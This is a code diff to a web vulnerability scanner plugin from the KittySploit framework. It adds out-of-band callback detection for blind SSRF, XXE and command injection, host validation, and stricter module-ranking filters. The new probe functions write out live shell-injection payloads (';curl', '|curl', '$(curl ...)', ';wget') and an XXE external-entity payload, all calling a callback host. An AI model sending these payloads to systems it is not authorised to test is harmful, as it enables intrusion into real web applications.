@@ -47,6 +47,7 @@ from lib.protocols.http.sqli_engine.oracles import (
     probe_order_by_sqli,
 )
 from lib.protocols.http.sqli_engine.oracles.header import probe_login_headers
+from lib.protocols.http.oob_correlator import OobCorrelator, guess_reachable_lhost
 
 try:
     import requests
@@ -154,9 +155,96 @@ COMMON_DISCOVERY_PATHS = [
     "wp-admin/",
     "admin/",
     "login/",
+    ".well-known/security.txt",
+    ".well-known/openid-configuration",
 ]
 
 API_HTTP_METHODS = {"get", "post"}
+HTTP_HOST_LABEL_RE = re.compile(r"^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$", re.I)
+ABSOLUTE_HTTP_URL_RE = re.compile(
+    r"https?://[a-zA-Z0-9][a-zA-Z0-9._\-/:%?=&+#]{3,220}",
+    re.I,
+)
+PASSIVE_SCANNER_SKIP_FRAGMENTS = (
+    "bruteforce",
+    "webshell",
+    "_shell",
+    "password_spray",
+)
+GENERIC_TECH_TOKENS = frozenset(
+    {
+        "nginx",
+        "apache",
+        "linux",
+        "ubuntu",
+        "debian",
+        "windows",
+        "http",
+        "https",
+        "swagger",
+        "openapi",
+        "json",
+        "html",
+        "api",
+        "graphql",
+        "fastapi",
+        "flask",
+        "django",
+        "react",
+        "vue",
+        "angular",
+        "tomcat",
+        "php",
+        "iis",
+        "node",
+        "python",
+        "werkzeug",
+        "gunicorn",
+        "uvicorn",
+        "starlette",
+    }
+)
+MODULE_TAG_STOPWORDS = frozenset(
+    {
+        "scanner",
+        "web",
+        "http",
+        "detect",
+        "cve",
+        "rce",
+        "unauth",
+        "auth",
+        "intrusive",
+        "vuln",
+        "vkev",
+        "kev",
+        "edb",
+        "multi",
+        "linux",
+        "windows",
+        "unix",
+        "info",
+        "low",
+        "medium",
+        "high",
+        "critical",
+        "wordpress",
+        "wp",
+        "plugin",
+        "exploit",
+        "network_probe",
+        "active",
+        "passive",
+    }
+)
+WEAK_MODULE_EVIDENCE_MARKERS = (
+    "http service reachable",
+    "run matching exploit module",
+    "validate with",
+    "try matching exploit",
+    "reachable — run",
+    "reachable - run",
+)
 MAX_JAVASCRIPT_FILES = 24
 MAX_RESPONSE_FINGERPRINT_BYTES = 32768
 
@@ -299,12 +387,18 @@ DETECTION_CONFIDENCE_BASE = {
     "ssrf_backend_error": 64,
     "rce_cmd_injection": 97,
     "xxe_file_read": 95,
+    "ssrf_oob": 96,
+    "xxe_oob": 94,
+    "rce_oob": 95,
 }
 
 # Lower value = stronger / more reliable signal for secondary sort.
 DETECTION_RELIABILITY_RANK = {
     "sqli_error": 0,
     "rce_cmd_injection": 0,
+    "ssrf_oob": 0,
+    "xxe_oob": 0,
+    "rce_oob": 0,
     "xxe_file_read": 1,
     "lfi_linux_passwd": 1,
     "lfi_windows_ini": 2,
@@ -326,7 +420,7 @@ class WebVulnScannerPlugin(Plugin):
     __info__ = {
         "name": "web_vuln_scanner",
         "description": "Crawl targets, fingerprint stack, run passive detectors, deep active SQLi/XSS/LFI probes on parameters, and auto-run ranked HTTP scanner modules",
-        "version": "4.0.0",
+        "version": "4.2.1",
         "author": "KittySploit Team",
         "dependencies": ["requests", "beautifulsoup4"],
     }
@@ -338,6 +432,7 @@ class WebVulnScannerPlugin(Plugin):
         self.crawl_delay = 0.2
         self.verbose = False
         self.aggressive = False
+        self.passive_only = False
         self.min_confidence = 70
         self.max_modules = 12
         self.max_urls = 150
@@ -377,6 +472,13 @@ class WebVulnScannerPlugin(Plugin):
         self.soft_404_fingerprints: Dict[str, Dict[str, Any]] = {}
         self.javascript_urls: Set[str] = set()
         self.max_params_per_endpoint = 8
+        self.oob_enabled = True
+        self.oob_lhost = ""
+        self.oob_local_port = 0
+        self.oob: Optional[OobCorrelator] = None
+        self._oob_pending: Dict[str, Dict[str, Any]] = {}
+        self._oob_lock = Lock()
+        self._module_index_cache: Optional[List[Dict[str, Any]]] = None
 
     def check_dependencies(self):
         if not REQUESTS_AVAILABLE:
@@ -459,6 +561,34 @@ class WebVulnScannerPlugin(Plugin):
             default=8,
         )
         parser.add_argument("-v", "--verbose", dest="verbose", help="Verbose output", action="store_true")
+        parser.add_argument(
+            "--oob",
+            dest="oob",
+            help="Enable out-of-band callbacks (Interactsh or --oob-lhost) for blind SSRF/XXE/RCE",
+            action="store_true",
+        )
+        parser.add_argument(
+            "--no-oob",
+            dest="no_oob",
+            help="Disable OOB correlation probes",
+            action="store_true",
+        )
+        parser.add_argument(
+            "--oob-lhost",
+            dest="oob_lhost",
+            help="Local callback IP/host if Interactsh is unavailable (lab SSRF)",
+            metavar="<host>",
+            type=str,
+            default="",
+        )
+        parser.add_argument(
+            "--oob-port",
+            dest="oob_port",
+            help="Local OOB HTTP port (0=ephemeral)",
+            metavar="<port>",
+            type=int,
+            default=0,
+        )
 
         if not args or not args[0]:
             parser.print_help()
@@ -501,6 +631,10 @@ class WebVulnScannerPlugin(Plugin):
                 request_budget=max(0, int(getattr(pargs, "request_budget", 0) or 0)),
                 max_probes_per_endpoint=max(0, int(getattr(pargs, "max_probes_per_endpoint", 0) or 0)),
                 max_params_per_endpoint=max(1, int(getattr(pargs, "max_params_per_endpoint", 8) or 8)),
+                oob_enabled=not bool(getattr(pargs, "no_oob", False)),
+                oob_force=bool(getattr(pargs, "oob", False)),
+                oob_lhost=str(getattr(pargs, "oob_lhost", "") or "").strip(),
+                oob_local_port=max(0, int(getattr(pargs, "oob_port", 0) or 0)),
             )
         except Exception as exc:
             print_error(f"An error occurred: {exc}")
@@ -534,6 +668,10 @@ class WebVulnScannerPlugin(Plugin):
         request_budget: int,
         max_probes_per_endpoint: int,
         max_params_per_endpoint: int,
+        oob_enabled: bool,
+        oob_force: bool,
+        oob_lhost: str,
+        oob_local_port: int,
     ) -> bool:
         try:
             self._reset_state()
@@ -543,6 +681,7 @@ class WebVulnScannerPlugin(Plugin):
             self.crawl_delay = crawl_delay
             self.verbose = verbose
             self.aggressive = aggressive
+            self.passive_only = bool(passive_only)
             self.min_confidence = max(0, min(100, int(min_confidence)))
             self.max_modules = max(0, int(max_modules))
             self.max_urls = max(10, int(max_urls))
@@ -569,6 +708,16 @@ class WebVulnScannerPlugin(Plugin):
                 self.max_params_per_endpoint = max(self.max_params_per_endpoint, 16)
             elif self.stealth_mode:
                 self.max_params_per_endpoint = min(self.max_params_per_endpoint, 5)
+            self.oob_lhost = oob_lhost
+            self.oob_local_port = oob_local_port
+            if oob_force:
+                self.oob_enabled = True
+            elif not oob_enabled or passive_only:
+                self.oob_enabled = False
+            elif self.stealth_mode and not oob_force:
+                self.oob_enabled = False
+            else:
+                self.oob_enabled = True
             self._requests_spent = 0
             self._stealth_backoff = 1.0
             self.scan_started_at = time.time()
@@ -645,7 +794,12 @@ class WebVulnScannerPlugin(Plugin):
                 print_status("Step 5: Skipping active probes (--passive-only)")
             else:
                 print_status("Step 5: Running targeted active probes...")
-                active_hits = self._run_active_scans()
+                self._start_oob_session()
+                try:
+                    active_hits = self._run_active_scans()
+                    active_hits += self._collect_oob_findings()
+                finally:
+                    self._stop_oob_session()
                 print_success(f"Active probes recorded {active_hits} findings")
 
             if passive_only:
@@ -689,6 +843,7 @@ class WebVulnScannerPlugin(Plugin):
                 traceback.print_exc()
             return False
         finally:
+            self._stop_oob_session()
             self._close_http_sessions()
 
     def _reset_state(self):
@@ -707,6 +862,7 @@ class WebVulnScannerPlugin(Plugin):
         self.followup_candidates = []
         self.wordpress_confirmed = False
         self._wordpress_body_evidence = 0
+        self.passive_only = False
         self._requests_spent = 0
         self._stealth_backoff = 1.0
         self._budget_warned = False
@@ -716,6 +872,114 @@ class WebVulnScannerPlugin(Plugin):
         self._tracked_sessions_lock = Lock()
         self.soft_404_fingerprints = {}
         self.javascript_urls = set()
+        self.oob = None
+        self._oob_pending = {}
+        self._module_index_cache = None
+
+    def _start_oob_session(self):
+        if not self.oob_enabled or self.passive_only:
+            return
+        self.oob = OobCorrelator(
+            lhost=self.oob_lhost or guess_reachable_lhost(),
+            local_port=self.oob_local_port,
+            prefer_interactsh=True,
+            timeout=float(self.timeout),
+        )
+        ok, label = self.oob.start()
+        if ok:
+            print_info(f"OOB blind detection: {label}")
+        else:
+            self._verbose("OOB correlator could not start (missing crypto or network)")
+            self.oob = None
+
+    def _stop_oob_session(self):
+        if self.oob:
+            try:
+                self._collect_oob_findings(final=True)
+            except Exception as exc:
+                self._verbose(f"OOB drain failed: {exc}")
+            try:
+                self.oob.stop()
+            except Exception:
+                pass
+            self.oob = None
+
+    def _oob_issue_http(self) -> Tuple[str, str]:
+        if not self.oob or not self.oob.enabled:
+            return "", ""
+        token, url = self.oob.issue_http()
+        return token, url
+
+    def _track_oob_probe(
+        self,
+        token: str,
+        entry: Dict[str, Any],
+        param: str,
+        kind: str,
+        payload: str,
+        callback_url: str,
+    ):
+        if not token:
+            return
+        with self._oob_lock:
+            self._oob_pending[token] = {
+                "entry": entry,
+                "param": param,
+                "kind": kind,
+                "payload": payload,
+                "callback_url": callback_url,
+            }
+
+    def _collect_oob_findings(self, final: bool = False) -> int:
+        if not self.oob or not self.oob.enabled:
+            return 0
+        rounds = 4 if final else 2
+        recorded = 0
+        for round_idx in range(rounds):
+            for hit in self.oob.poll():
+                with self._oob_lock:
+                    meta = self._oob_pending.pop(hit.token, None)
+                if not meta:
+                    continue
+                recorded += self._record_oob_finding(hit, meta)
+            if round_idx + 1 < rounds:
+                time.sleep(1.8 if final else 1.2)
+        return recorded
+
+    def _record_oob_finding(self, hit, meta: Dict[str, Any]) -> int:
+        entry = meta.get("entry") or {}
+        param = str(meta.get("param") or "")
+        kind = str(meta.get("kind") or "ssrf")
+        payload = str(meta.get("payload") or meta.get("callback_url") or "")
+        detection_kind = {
+            "ssrf": "ssrf_oob",
+            "xxe": "xxe_oob",
+            "rce": "rce_oob",
+        }.get(kind, "ssrf_oob")
+        title = {
+            "ssrf": "Blind SSRF (OOB)",
+            "xxe": "Blind XXE (OOB)",
+            "rce": "Blind command injection (OOB)",
+        }.get(kind, "Blind SSRF (OOB)")
+        evidence = (
+            f"Out-of-band callback received ({hit.protocol}) from {hit.remote_address or 'unknown'}"
+        )
+        if hit.full_id:
+            evidence += f" — interaction id {hit.full_id}"
+        return self._record_result(
+            source="active",
+            name=title,
+            url=entry.get("url") or self.target_url,
+            method=entry.get("method") or "GET",
+            parameter=param,
+            severity="critical" if kind == "rce" else "high",
+            confidence=0,
+            evidence=evidence,
+            payload=payload[:500],
+            repro=self._build_repro_command(entry, param, payload) if entry and param else "",
+            signal=kind if kind in {"ssrf", "xxe", "rce"} else "ssrf",
+            detection_kind=detection_kind,
+        )
 
     def _init_session(self, user_agent: str, cookie: str):
         if urllib3 is not None:
@@ -803,21 +1067,53 @@ class WebVulnScannerPlugin(Plugin):
         scheme = (parsed.scheme or "http").lower()
         path = self._normalize_path(parsed.path)
         query = urlencode(sorted(parse_qsl(parsed.query, keep_blank_values=True)), doseq=True)
+        if not self._is_plausible_http_host(parsed.hostname):
+            raise ValueError(f"Invalid target URL: {raw_url}")
         netloc = self._normalized_netloc(parsed, scheme)
+        if not netloc:
+            raise ValueError(f"Invalid target URL: {raw_url}")
         normalized = urlunparse((scheme, netloc, path, "", query, ""))
         base_url = f"{scheme}://{netloc}"
         return normalized, base_url
 
+    @staticmethod
+    def _port_from_parsed(parsed) -> Optional[int]:
+        try:
+            return parsed.port
+        except ValueError:
+            return None
+
+    def _is_plausible_http_host(self, hostname: Optional[str]) -> bool:
+        if not hostname:
+            return False
+        host = hostname.strip().lower().rstrip(".")
+        if not host or len(host) > 253:
+            return False
+        if any(ord(ch) < 32 or ord(ch) > 126 for ch in host):
+            return False
+        if any(ch in host for ch in (' ', '@', '|', '\\', '"', "'", "<", ">", "{", "}", "^", "`", "~")):
+            return False
+        if host == "localhost":
+            return True
+        if host.startswith("[") and host.endswith("]"):
+            return True
+        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
+            try:
+                return all(0 <= int(part) <= 255 for part in host.split("."))
+            except ValueError:
+                return False
+        labels = host.split(".")
+        if len(labels) < 2:
+            return False
+        return all(label and len(label) <= 63 and HTTP_HOST_LABEL_RE.match(label) for label in labels)
+
     def _normalized_netloc(self, parsed, scheme: str) -> str:
-        host = (parsed.hostname or "").lower().rstrip(".")
-        if not host:
+        if not self._is_plausible_http_host(parsed.hostname):
             return ""
+        host = (parsed.hostname or "").lower().rstrip(".")
         if ":" in host and not host.startswith("["):
             host = f"[{host}]"
-        try:
-            port = parsed.port
-        except ValueError as exc:
-            raise ValueError(f"Invalid target port: {exc}") from exc
+        port = self._port_from_parsed(parsed)
         default_port = 443 if scheme == "https" else 80
         userinfo = ""
         if parsed.username:
@@ -840,13 +1136,22 @@ class WebVulnScannerPlugin(Plugin):
         return normalized
 
     def _canonicalize_url(self, url: str) -> str:
-        parsed = urlparse(url)
-        scheme = parsed.scheme.lower()
+        if not url or not isinstance(url, str):
+            return ""
+        try:
+            parsed = urlparse(url.strip())
+        except Exception:
+            return ""
+        scheme = (parsed.scheme or "").lower()
         if scheme not in {"http", "https"}:
+            return ""
+        if not self._is_plausible_http_host(parsed.hostname):
             return ""
         path = self._normalize_path(parsed.path)
         query = urlencode(sorted(parse_qsl(parsed.query, keep_blank_values=True)), doseq=True)
         netloc = self._normalized_netloc(parsed, scheme)
+        if not netloc:
+            return ""
         return urlunparse((scheme, netloc, path, "", query, ""))
 
     def _same_origin(self, url: str) -> bool:
@@ -1143,9 +1448,14 @@ class WebVulnScannerPlugin(Plugin):
                     if page.get("final_url") and not self._same_origin(page["final_url"]):
                         self._verbose(f"Ignoring cross-origin redirect from {current_url} to {page['final_url']}")
                         continue
-                    for candidate in sorted(
-                        self._extract_candidate_links(current_url, page["text"], page.get("content_type", ""))
-                    ):
+                    try:
+                        link_batch = self._extract_candidate_links(
+                            current_url, page["text"], page.get("content_type", "")
+                        )
+                    except Exception as exc:
+                        self._verbose(f"Link extraction failed for {current_url}: {exc}")
+                        link_batch = set()
+                    for candidate in sorted(link_batch):
                         if len(self.crawled_urls) + len(frontier) >= self.max_urls:
                             break
                         if candidate not in scheduled:
@@ -1197,7 +1507,7 @@ class WebVulnScannerPlugin(Plugin):
             if normalized and self._should_visit_url(normalized):
                 candidates.add(normalized)
 
-        raw_urls = re.findall(r"""https?://[^\s<>"']+""", text or "")
+        raw_urls = ABSOLUTE_HTTP_URL_RE.findall(text or "")
         for raw in raw_urls:
             normalized = self._canonicalize_url(raw.rstrip(".,);"))
             if normalized and self._should_visit_url(normalized):
@@ -1690,10 +2000,77 @@ class WebVulnScannerPlugin(Plugin):
 
     def _register_technology(self, tech: str, url: str):
         normalized = re.sub(r"[^a-z0-9.+_-]", "", tech.lower()).strip()
-        if not normalized:
+        if not normalized or self._is_version_like_token(normalized):
             return
         self.tech_tokens.add(normalized)
         self.technologies[normalized].add(url)
+
+    @staticmethod
+    def _is_version_like_token(token: str) -> bool:
+        return bool(re.fullmatch(r"\d+(\.\d+)+([a-z0-9-]*)?", token or ""))
+
+    def _confirmed_product_tokens(self) -> Set[str]:
+        return {
+            token
+            for token in self.tech_tokens
+            if token not in GENERIC_TECH_TOKENS and not self._is_version_like_token(token)
+        }
+
+    def _passive_scanner_basenames(self) -> Set[str]:
+        return {path.rsplit("/", 1)[-1] for path in PASSIVE_SCANNERS}
+
+    def _is_vendor_product_detect(self, mod_path: str) -> bool:
+        if not mod_path.startswith("scanner/http/"):
+            return False
+        basename = mod_path.rsplit("/", 1)[-1]
+        if basename in self._passive_scanner_basenames():
+            return False
+        return "_detect" in basename or basename.endswith("_detect.py")
+
+    def _product_slugs_from_module(self, mod_path: str, meta: Optional[Dict[str, Any]] = None) -> Set[str]:
+        slugs: Set[str] = set()
+        if meta:
+            for tag in meta.get("tags") or []:
+                token = str(tag).lower().strip()
+                if len(token) >= 4 and token not in MODULE_TAG_STOPWORDS and token not in GENERIC_TECH_TOKENS:
+                    slugs.add(token)
+        basename = mod_path.rsplit("/", 1)[-1].lower()
+        if basename.endswith("_detect.py"):
+            basename = basename[: -len("_detect.py")]
+        for part in re.split(r"[_-]+", basename):
+            if len(part) >= 4 and part not in MODULE_TAG_STOPWORDS and part not in GENERIC_TECH_TOKENS:
+                if not part.isdigit() and part not in {"detect", "unauth", "auth"}:
+                    slugs.add(part)
+        return slugs
+
+    def _module_product_confirmed(self, mod_path: str, meta: Optional[Dict[str, Any]] = None) -> bool:
+        if mod_path in self.linked_modules:
+            return True
+        slugs = self._product_slugs_from_module(mod_path, meta)
+        confirmed = self._confirmed_product_tokens()
+        return bool(slugs.intersection(confirmed))
+
+    def _accept_module_finding(self, mod_path: str, reason: str, confidence: int) -> bool:
+        text = (reason or "").lower()
+        if any(marker in text for marker in WEAK_MODULE_EVIDENCE_MARKERS):
+            self._verbose(f"Rejected weak module signal from {mod_path}: {reason[:120]}")
+            return False
+
+        meta_row = next((row for row in self._module_index_rows() if row.get("path") == mod_path), None)
+
+        if self._is_vendor_product_detect(mod_path):
+            if not self._module_product_confirmed(mod_path, meta_row):
+                self._verbose(f"Rejected unconfirmed product detector {mod_path}")
+                return False
+            if "advisory surface" in text:
+                slugs = self._product_slugs_from_module(mod_path, meta_row)
+                if not any(slug in text for slug in slugs):
+                    self._verbose(f"Rejected advisory-surface noise from {mod_path}")
+                    return False
+
+        if confidence and confidence < self.min_confidence:
+            return False
+        return True
 
     def _finalize_cms_fingerprints(self):
         """
@@ -1709,9 +2086,20 @@ class WebVulnScannerPlugin(Plugin):
             self.tech_tokens.discard("wordpress")
             self.technologies.pop("wordpress", None)
 
+        for token in list(self.tech_tokens):
+            if self._is_version_like_token(token):
+                self.tech_tokens.discard(token)
+                self.technologies.pop(token, None)
+
     def _run_passive_scanners(self) -> int:
         scanner_paths = self._passive_scanner_paths()
         self.passive_scanner_paths = set(scanner_paths)
+        extra = len(scanner_paths) - len(PASSIVE_SCANNERS)
+        if extra > 0:
+            print_info(
+                f"Running {len(scanner_paths)} passive HTTP modules "
+                f"({len(PASSIVE_SCANNERS)} core + {extra} stack-matched from module index)"
+            )
         hits = 0
         with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
             futures = {executor.submit(self._run_passive_scanner, mod_path): mod_path for mod_path in scanner_paths}
@@ -1723,16 +2111,72 @@ class WebVulnScannerPlugin(Plugin):
                     self._verbose(f"Passive detector failed: {exc}")
         return hits
 
+    def _module_index_rows(self) -> List[Dict[str, Any]]:
+        if self._module_index_cache is not None:
+            return self._module_index_cache
+        if not self.framework or not hasattr(self.framework, "module_loader"):
+            return []
+        try:
+            from core.module_index import get_scanner_modules
+
+            discovered = self.framework.module_loader.discover_modules()
+            self._module_index_cache = get_scanner_modules(discovered)
+            return self._module_index_cache
+        except Exception as exc:
+            self._verbose(f"Module index unavailable: {exc}")
+            return []
+
+    def _tech_matched_detector_paths(self, limit: int) -> List[str]:
+        if limit <= 0:
+            return []
+
+        confirmed = self._confirmed_product_tokens()
+        if not confirmed:
+            return []
+
+        scored: List[Tuple[int, str]] = []
+
+        for row in self._module_index_rows():
+            path = str(row.get("path") or "")
+            if not path.startswith("scanner/http/") or not self._is_vendor_product_detect(path):
+                continue
+            lower = path.lower()
+            if path in PASSIVE_SCANNERS or any(skip in lower for skip in PASSIVE_SCANNER_SKIP_FRAGMENTS):
+                continue
+            if "wordpress" in lower and not self.wordpress_confirmed:
+                continue
+            if any(skip in lower for skip in ("unauth_rce", "webshell", "_shell")) and not self.aggressive:
+                continue
+
+            slugs = self._product_slugs_from_module(path, row)
+            overlap = slugs.intersection(confirmed)
+            if not overlap:
+                continue
+
+            score = 40 * len(overlap)
+            if row.get("cve"):
+                score += 8
+            scored.append((score, path))
+
+        scored.sort(key=lambda item: (-item[0], item[1]))
+        return [path for _, path in scored[:limit]]
+
     def _passive_scanner_paths(self) -> List[str]:
-        if self.framework and hasattr(self.framework, "module_loader"):
-            try:
-                discovered = self.framework.module_loader.discover_modules()
-                scanners = sorted(path for path in discovered if path.startswith("scanner/http/"))
-                if scanners:
-                    return scanners
-            except Exception as exc:
-                self._verbose(f"Unable to enumerate scanner/http modules dynamically: {exc}")
-        return list(PASSIVE_SCANNERS)
+        ordered: List[str] = []
+        seen: Set[str] = set()
+        for mod_path in PASSIVE_SCANNERS:
+            if mod_path not in seen:
+                seen.add(mod_path)
+                ordered.append(mod_path)
+
+        extra_cap = 45 if self.aggressive else 28
+        if self.stealth_mode:
+            extra_cap = min(extra_cap, 12)
+        for mod_path in self._tech_matched_detector_paths(extra_cap):
+            if mod_path not in seen:
+                seen.add(mod_path)
+                ordered.append(mod_path)
+        return ordered
 
     def _run_passive_scanner(self, mod_path: str) -> bool:
         module = self._load_and_configure_http_module(mod_path)
@@ -1755,6 +2199,8 @@ class WebVulnScannerPlugin(Plugin):
             or "info"
         )
         evidence = reason or module.description or "Passive detector reported a match"
+        if not self._accept_module_finding(mod_path, evidence, confidence):
+            return False
         info = getattr(module, "vulnerability_info", {}) or {}
         linked = getattr(module, "__info__", {}).get("modules", []) or []
         for linked_module in linked:
@@ -1801,6 +2247,7 @@ class WebVulnScannerPlugin(Plugin):
         cap = self.active_param_limit
         if self.aggressive:
             cap = max(cap, 120)
+        targets.sort(key=lambda entry: (-entry.get("interesting_score", 0), entry.get("url", "")))
         selected = targets[:cap]
         hits = 0
 
@@ -2210,6 +2657,18 @@ class WebVulnScannerPlugin(Plugin):
                 signal="ssrf",
                 detection_kind="ssrf_backend_error",
             )
+        self._probe_ssrf_oob(entry, param)
+        return 0
+
+    def _probe_ssrf_oob(self, entry: Dict[str, Any], param: str) -> int:
+        if not self.oob or not self.oob.enabled:
+            return 0
+        token, callback_url = self._oob_issue_http()
+        if not token or not callback_url:
+            return 0
+        self._track_oob_probe(token, entry, param, "ssrf", callback_url, callback_url)
+        for payload in (callback_url, callback_url.replace("http://", "https://", 1)):
+            self._send_entry_request(entry, self._mutated_params(entry, param, payload))
         return 0
 
     def _probe_rce(self, entry: Dict[str, Any], param: str) -> int:
@@ -2232,6 +2691,33 @@ class WebVulnScannerPlugin(Plugin):
                     signal="rce",
                     detection_kind="rce_cmd_injection",
                 )
+        self._probe_rce_oob(entry, param)
+        return 0
+
+    def _probe_rce_oob(self, entry: Dict[str, Any], param: str) -> int:
+        if not self.oob or not self.oob.enabled:
+            return 0
+        token, callback_url = self._oob_issue_http()
+        if not token or not callback_url:
+            return 0
+        safe_url = callback_url.replace("'", "")
+        payloads = [
+            f";curl -s -m 8 {safe_url}",
+            f"|curl -s -m 8 {safe_url}",
+            f"&& curl -s -m 8 {safe_url}",
+            f";wget -qO- {safe_url}",
+        ]
+        if self.aggressive:
+            payloads.extend(
+                [
+                    f"`curl -s -m 8 {safe_url}`",
+                    f"$(curl -s -m 8 {safe_url})",
+                ]
+            )
+        primary = payloads[0]
+        self._track_oob_probe(token, entry, param, "rce", primary, callback_url)
+        for payload in payloads:
+            self._send_entry_request(entry, self._mutated_params(entry, param, payload))
         return 0
 
     def _probe_xxe(self, entry: Dict[str, Any], param: str, baseline_resp=None) -> int:
@@ -2249,6 +2735,7 @@ class WebVulnScannerPlugin(Plugin):
         kind, evidence = self._lfi_evidence(response.text or "")
         baseline_kind, _ = self._lfi_evidence(baseline_resp.text or "") if baseline_resp is not None else ("", "")
         if not kind or kind == baseline_kind:
+            self._probe_xxe_oob(entry, param)
             return 0
         return self._record_result(
             source="active",
@@ -2264,6 +2751,25 @@ class WebVulnScannerPlugin(Plugin):
             signal="xxe",
             detection_kind="xxe_file_read",
         )
+
+    def _probe_xxe_oob(self, entry: Dict[str, Any], param: str) -> int:
+        if not self.oob or not self.oob.enabled:
+            return 0
+        token, callback_url = self._oob_issue_http()
+        if not token or not callback_url:
+            return 0
+        payload = (
+            '<?xml version="1.0"?>'
+            f'<!DOCTYPE ksp [<!ENTITY xxe SYSTEM "{callback_url}">]>'
+            "<ksp>&xxe;</ksp>"
+        )
+        self._track_oob_probe(token, entry, param, "xxe", payload, callback_url)
+        content_type = str(entry.get("content_type") or entry.get("enctype") or "").lower()
+        if "xml" in content_type:
+            self._send_raw_request(entry, payload, "application/xml")
+        else:
+            self._send_entry_request(entry, self._mutated_params(entry, param, payload))
+        return 0
 
     def _send_entry_request(
         self,
@@ -2361,9 +2867,14 @@ class WebVulnScannerPlugin(Plugin):
             return []
 
         discovered = self.framework.module_loader.discover_modules()
+        index_meta = {
+            str(row.get("path") or ""): row for row in self._module_index_rows() if row.get("path")
+        }
         signals = {result["signal"] for result in self.results if result.get("signal")}
         patterns = [pattern.strip().lower() for pattern in module_patterns if pattern.strip()]
         candidates = []
+
+        confirmed_products = self._confirmed_product_tokens()
 
         for mod_path in sorted(discovered.keys()):
             lower = mod_path.lower()
@@ -2378,39 +2889,40 @@ class WebVulnScannerPlugin(Plugin):
             if "bruteforce" in lower:
                 continue
 
+            meta = index_meta.get(mod_path) or {}
+            if self._is_vendor_product_detect(mod_path) and mod_path not in self.linked_modules:
+                slugs = self._product_slugs_from_module(mod_path, meta)
+                if not slugs.intersection(confirmed_products):
+                    continue
+
             score = 0
             if mod_path in self.linked_modules:
                 score += 120
 
             if not patterns or patterns == ["all"]:
-                score += 5
+                score += 0
             elif any(pattern in lower for pattern in patterns):
                 score += 70
             elif mod_path not in self.linked_modules:
                 continue
 
-            for tech in self.tech_tokens:
-                if tech in lower:
-                    score += 25
+            product_overlap = self._product_slugs_from_module(mod_path, meta).intersection(confirmed_products)
+            score += 45 * len(product_overlap)
+
             for signal in signals:
-                if signal in lower:
-                    score += 20
+                if signal in lower and mod_path in self.linked_modules:
+                    score += 25
 
-            if "http" in lower:
-                score += 10
-
-            if "sql_injection" in lower or "sqli" in lower:
-                score += 38
-            if "post/http/sqli_shell" in lower:
+            if "post/http/sqli_shell" in lower and "sqli" in signals:
                 score += 45
             if "php_injection" in lower and "php" in self.tech_tokens:
                 score += 28
-            if "xss" in lower or "cross_site" in lower:
-                score += 18
-            if "lfi" in lower or "traversal" in lower or "path_traversal" in lower:
-                score += 18
 
-            if score >= 35:
+            if meta.get("cve") and product_overlap:
+                score += 12
+
+            min_score = 55 if mod_path.startswith("scanner/http/") else 45
+            if score >= min_score:
                 candidates.append({"path": mod_path, "score": score})
 
         candidates.sort(key=lambda item: item["score"], reverse=True)
@@ -2476,6 +2988,11 @@ class WebVulnScannerPlugin(Plugin):
         if not positive:
             return
 
+        evidence = reason or f"Follow-up module check positive (score={score})"
+        resolved_confidence = confidence or min(95, 70 + min(score, 25))
+        if not self._accept_module_finding(mod_path, evidence, resolved_confidence):
+            return
+
         info = getattr(module, "vulnerability_info", {}) or {}
         severity = self._normalize_severity(info.get("severity") or "info")
         if mod_path.startswith("exploits/") and severity == "info":
@@ -2487,8 +3004,8 @@ class WebVulnScannerPlugin(Plugin):
             url=self.target_url,
             method="CHECK",
             severity=severity,
-            confidence=confidence or min(95, 70 + min(score, 25)),
-            evidence=reason or f"Follow-up module check positive (score={score})",
+            confidence=resolved_confidence,
+            evidence=evidence,
             metadata=info,
             signal=self._signal_from_path(mod_path),
         )
@@ -2777,6 +3294,8 @@ class WebVulnScannerPlugin(Plugin):
             "false_positive_risk": self._false_positive_risk(),
             "max_probes_per_endpoint": self.max_probes_per_endpoint,
             "waf_detected": self.waf_detected,
+            "oob_enabled": self.oob_enabled,
+            "oob_mode": getattr(self.oob, "mode", "") if self.oob else "",
             "technologies": {tech: sorted(urls) for tech, urls in sorted(self.technologies.items())},
             "crawled_urls": sorted(self.crawled_urls),
             "javascript_files_analyzed": len(self.javascript_urls),
